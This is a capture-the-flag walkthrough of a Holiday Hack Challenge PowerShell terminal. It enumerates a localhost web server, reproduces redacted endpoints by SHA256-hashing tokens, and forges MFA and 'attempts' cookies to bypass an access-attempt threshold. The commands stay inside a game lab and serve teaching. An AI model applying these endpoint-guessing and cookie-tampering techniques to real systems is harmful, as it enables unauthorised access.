# OBJECTIVE 10 - PowerShell #
Difficulty: ❄️❄️❄️

[Direct Link](https://hhc24-wetty.holidayhackchallenge.com?&challenge=termPowershell)

## OBJECTIVE : ##
>Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.
#
## HINTS: ##
<details>
  <summary>Hints provided for Objective 10</summary>
  
>-	GOLD:
>    -  I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to Get-FileHash -Algorithm SHA256.
>    -  They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and Response "EDR". The whole system is literally that you set a threshold and after that many attempts, the response is passed through... I can't believe it. He supposedly implemented it wrong so the threshold cookie is highly likely shared between endpoints!

  
</details>

#  

## PROCEDURE : ##
### 🥈 SILVER MEDAL ###
The first few questions are pretty straightforward:
```powershell
1) There is a file in the current directory called 'welcome.txt'. Read the contents of this file
PS /home/user> Get-Content welcome.txt

2) Geez that sounds ominous, I'm sure we can get past the defense mechanisms. 
We should warm up our PowerShell skills. 
How many words are there in the file?
PS /home/user> Get-Content welcome.txt | Measure-Object -word
Lines Words Characters Property
----- ----- ---------- --------
        180

3) There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?
PS /home/user> netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:1225          0.0.0.0:*               LISTEN     
tcp6       0      0 172.17.0.3:35806        52.188.247.151:443      ESTABLISHED

4) You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?
PS /home/user> Invoke-WebRequest http://localhost:1225
Invoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED).

5) It looks like defensive measures are in place, it is protected by basic authentication. 
Try authenticating with a standard admin username and password.
Ps/home/user> $cred = Get-Credential
PS /home/user> Invoke-WebRequest http://localhost:1225 -Credential $cred -AllowUnencryptedAuthentication
```
It starts to get more interesting from this point – to answer this next question, we need to create a for loop that cycles through endpoints sequentially and measures the number of words for each one.  The loop must break when it finds an endpoint with exactly 138 words:
```powershell
6) There are too many endpoints here. 
Use a loop to download the contents of each page. What page has 138 words? 
When you find it, communicate with the URL and print the contents to the terminal.
PS /home/user> $i=1                 
PS /home/user> for (;$i -le 15;$i++)    
>> {$Wordcount=(Invoke-WebRequest http://localhost:1225/endpoints/$i -Credential $cred -AllowUnencryptedAuthentication | Measure-Object -word).words                                                                                      
>> Write-Host "Element No: $i has $Wordcount words"
>> If ($Wordcount -eq 138){
>> $Response = Invoke-WebRequest http://localhost:1225/endpoints/$i -Credential $cred -AllowUnencryptedAuthentication 
>> Write-Host $Response.Content   
>> break 
>> } 
>> } 
Element No: 1 has 130 words                                                                                          
Element No: 2 has 127 words
.
.
Element No: 11 has 150 words
Element No: 12 has 123 words
Element No: 13 has 138 words
<html><head><title>MFA token scrambler</title></head><body><p>Yuletide cheer fills the air,<br>    A season of love, of care.<br>    The world is bright, full of light,<br>    As we celebrate this special night.<br>    The tree is trimmed, the stockings hung,<br>    Carols are sung, bells are rung.<br>    Families gather, friends unite,<br>    In the glow of the fire’s light.<br>    The air is filled with joy and peace,<br>    As worries and cares find release.<br>    Yuletide cheer, a gift so dear,<br>    Brings warmth and love to all near.<br>    May we carry it in our hearts,<br>    As the season ends, as it starts.<br>    Yuletide cheer, a time to share,<br>    The love, the joy, the care.<br>    May it guide us through the year,<br>    In every laugh, in every tear.<br>    Yuletide cheer, a beacon bright,<br>    Guides us through the winter night </p><p> Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv</p></body></html>

7) There seems to be a csv file in the comments of that page.  That could be valuable, read the contents of that csv-file!
PS /home/user> (Invoke-WebRequest -uri http://localhost:1225/token_overview.csv -Credential $cred -AllowUnencryptedAuthentication).content > csvfile.csv
PS /home/user> Get-Content ./csvfile.csv
    
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
# [*] SYSTEMLOG
# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
# [-] ERROR, memory corruption, not all endpoints have been REDACTED
# [*] Verification endpoint still active
# [*] http://127.0.0.1:1225/tokens/<sha256sum>
# [*] Contact system administrator to unlock panic mode
# [*] Site functionality at minimum to keep weapons active
```

Conveniently the `.csv` file tells us that we can communicate with an endpoint at `http://localhost:1225/tokens/<sha256sum>` and luckily there is still one sha256 value that hasn’t been redacted, so we can use it to call the api endpoint.  

```powershell
8) Luckily the defense mechanisms were faulty! 
There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint!
PS /home/user> Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $cred -AllowUnencryptedAuthentication
```

Now things start to get trickier – the api endpoint requires a cookie.  We can set this by creating a `WebRequestSession` and adding a cookie to it:
```powershell
9) It looks like it requires a cookie token, set the cookie and try again.
PS /home/user> $url1 = “http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C”
PS /home/user> $session1 = New-Object Microsoft.PowerShell.Commands.WebRequestSession      
PS /home/user> $cookie1 = New-Object System.Net.Cookie("token", "5f8dd236f862f4507835b0e418907ffc", "/", "127.0.0.1")
PS /home/user> $session1.Cookies.Add($cookie1)
PS /home/user> (Invoke-WebRequest -Uri $url1 -WebSession $session1 -Credential $cred -AllowUnencryptedAuthentication).Content
                                              
<h1>Cookie 'mfa_code', use it at <a href='1732384990.947703'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a></h1>
```
Ok, so now we’ve got a MFA token and the url path to use it at.  I created a new variable for a new session `$session2` and another variable for the new url to call `$url2`.
```powershell
10) Sweet we got a MFA token! We might be able to get access to the system.
 Validate that token at the endpoint!
PS /home/user> $session2 = New-Object Microsoft.PowerShell.Commands.WebRequestSession      
PS /home/user>  $url2=”http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C”
```

Next we need a regex expression to extract the mfa code from the cookie.  It matches for `href=` and extracts the part following it.  So this command will request the mfa code and extract it from the server response and place it neatly in a variable called `$mfa_token`.

At the same time we also want to add this cookie (along with the previously obtained `token` cookie) to our session before calling `$url2`.  We can use semi-colons `;` to include all the separate powershell commands on a single line and run them all at once and before the MFA token expires:
```powershell
PS /home/user> $mfa_token = [regex]::match((Invoke-WebRequest -Uri $url1 -WebSession $session1 -Credential $cred -AllowUnencryptedAuthentication).Content, "href='([^']*)'").Groups[1].Value ; 
$cookie2 = New-Object System.Net.Cookie("mfa_token","$mfa_token","/", "127.0.0.1") ; $session2.Cookies.Add($cookie1) ; 
$session2.Cookies.add($cookie2) ; 
(Invoke-WebRequest -Uri $url2 -WebSession $session2 -Credential $cred -AllowUnencryptedAuthentication).content 

<h1>[+] Success</h1><br><p>Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==</p> 
```

The response we get is something that looks like a base64 encoded message and we are asked to decode it.  For this we need to follow the same procedure as for question 10 to generate the mfa token, pass it to the server and obtain a response. 

Next we need a regex expression to extract only the text we are interested in that lies between `<p>` and `</p>` and finally we can base64 decode this to complete the objective:
```powershell
11) That looks like base64! Decode it so we can get the final secret! 
PS /home/user> $mfa_token = [regex]::match((Invoke-WebRequest -Uri $url1 -WebSession $session1 -Credential $cred -AllowUnencryptedAuthentication).Content, "href='([^']*)'").Groups[1].Value ; 
$cookie2 = New-Object System.Net.Cookie("mfa_token","$mfa_token","/", "127.0.0.1") ; $session2.Cookies.Add($cookie1) ; 
$session2.Cookies.add($cookie2) ; 
$Response = (Invoke-WebRequest -Uri $url2 -WebSession $session2 -Credential $cred -AllowUnencryptedAuthentication).content ;
Write-Host $Response;
$base64String = [regex]::match($Response, "<p>(.*?)</p>").Groups[1].Value;
Write-Host $base64String;
$decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64String));
Write-Host $decodedString

Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction

Hurray! You have thwarted their defenses!
Alabaster can now access their weaponry and put a stop to it.
Once HHC grants your achievement, you can close this terminal.
```
#
### 🥇 GOLD MEDAL ###

For this next part, I decided it would be best to stick to where the hints are trying to guide me.  First let’s try to replicate the token hashes using `Get-Filehash`.

We can achieve this by testing with the last token in the `.csv` file (since we know what it’s correct hash value should be).  The token value needs to be placed in a file and the `Get-FileHash` is called on that file, with `Select-Object` being used to limit the output to just the hash value:
```powershell
PS /home/user>“5f8dd236f862f4507835b0e418907ffc” > token_1
PS /home/user> Get-FileHash ./token_1 -Algorithm SHA256 | Select-Object -ExpandProperty Hash
4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
```

OK – this looks promising, it looks like we have the correct hash method – so let’s try hashing another token now:
```powershell
PS /home/user> “67c7aef0d5d3e97ad2488babd2f4c749” > token_2
PS /home/user> Get-FileHash ./token_2 -Algorithm SHA256 | Select-Object -ExpandProperty Hash
BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60
```

Ok let’s try calling an endpoint with this new hash now:
```powershell
PS /home/user> $session2 = New-Object Microsoft.PowerShell.Commands.WebRequestSession                                                                                                                                                         PS /home/user> $url2 = "http://127.0.0.1:1225/mfa_validate/BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"                                                                                                    
PS /home/user> $mfa_token = [regex]::match((Invoke-WebRequest -Uri $url1 -WebSession $session1 -Credential $cred -AllowUnencryptedAuthentication).Content, "href='([^']*)'").Groups[1].Value ; 
$cookie2 = New-Object System.Net.Cookie("mfa_token","$mfa_token","/", "127.0.0.1") ; $session2.Cookies.Add($cookie1) ; 
$session2.Cookies.add($cookie2) ; 
(Invoke-WebRequest -Uri $url2 -WebSession $session2 -Credential $cred -AllowUnencryptedAuthentication).content 
<h1>[*] Setting cookie attempts</h1> 
PS /home/user> $session2.Cookies.GetAllCookies()

Comment    : 
CommentUri : 
HttpOnly   : False
Discard    : False
Domain     : 127.0.0.1
Expired    : False
Expires    : 01/01/0001 00:00:00
Name       : attempts
Path       : /
Port       : 
Secure     : False
TimeStamp  : 12/01/2024 16:47:14
Value      : c25ha2VvaWwK01
Version    : 0 
```

We have a new cookie called `attempts` with a value of `c25ha2VvaWwK01`.  If we base64 decode this value in Cyberchef we find that `c25ha2VvaWwK` decodes to **snakeoil**, so the `01` at the end must be some kind of counter.   In fact, if we make another attempt at resolving this endpoint we see that the cookie’s value changes to `c25ha2VvaWwK02`.  This keeps on going until the 10th attempt, beyond which the cookie’s value stops being incremented.  This is pretty much what I was expecting to see given the hints we are given.

At this point it’s just a matter of importing the data as a `.csv` file, re-initialising the web-session and going through each end-point one by one, calculating its hash, generating a MFA token and calling the endpoint with the correct cookies set.  For the `attempts` cookie we can set this to `c25ha2VvaWwK10` so that all the endpoints are resolved. Microsoft Co-Pilot was a huge help in [creating a script for this](Code/Enumerate_Endpoints.ps1) which I typed into Notepad++ and then simply copied and pasted it into the console.

And this time we get a successful response from one of the endpoints and we don’t even have to base64 decode it!

```powershell
Current Token: 7b7f6891b6b6ab46fe2e85651db8205f :   <h1>[-] ERROR: Access Denied</h1><br> [!] Logging access attempts
Current Token: 45ffb41c4e458d08a8b08beeec2b4652 :   <h1>[+] Success, defense mechanisms deactivated.</h1><br>Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail</p>
Current Token: d0e6bfb6a4e6531a0c71225f0a3d908d :   <h1>[-] ERROR: Access Denied</h1><br> [!] Logging access attempts
Current Token: bd7efda0cb3c6d15dd896755003c635c :   <h1>[-] ERROR: Access Denied</h1><br> [!] Logging access attempts
```
 

